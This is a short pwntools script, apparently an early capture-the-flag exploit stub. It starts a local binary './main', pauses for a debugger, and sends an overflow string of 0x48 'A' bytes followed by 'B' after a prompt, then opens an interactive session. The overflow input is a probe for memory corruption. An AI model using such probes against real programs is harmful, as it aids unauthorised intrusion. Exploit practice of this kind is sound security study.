from pwn import *

p = process('./main')

pause()
p.sendafter(b': ', b'A'*0x48+b'B')

p.interactive()
